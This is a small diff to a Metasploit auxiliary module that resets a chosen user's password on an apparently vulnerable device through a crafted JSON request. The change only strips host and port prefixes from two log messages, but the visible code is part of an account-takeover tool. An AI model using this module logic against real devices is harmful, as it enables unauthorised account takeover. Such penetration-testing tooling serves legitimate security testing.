@@ -57,7 +57,7 @@ class MetasploitModule < Msf::Auxiliary
   def reset_pass(config_uri, cookie)
     pass_change_req = '{"device_props":{"' + "#{datastore['TARGET_USERNAME']}" + '_password' + '":"' + "#{datastore['NEW_PASSWORD']}" + '"},"template_props":{"config_id":"11"}}'
 
-    print_status("#{rhost}:#{rport} - Changing password for #{datastore['TARGET_USERNAME']} to #{datastore['NEW_PASSWORD']}")
+    print_status("Changing password for #{datastore['TARGET_USERNAME']} to #{datastore['NEW_PASSWORD']}")
 
     res = send_request_cgi(
       {
@@ -90,7 +90,7 @@ class MetasploitModule < Msf::Auxiliary
     if good_response
       print_good('Password successfully changed!')
     else
-      print_error("#{rhost}:#{rport} - Failed to change password.")
+      print_error("Failed to change password.")
     end
   end
 
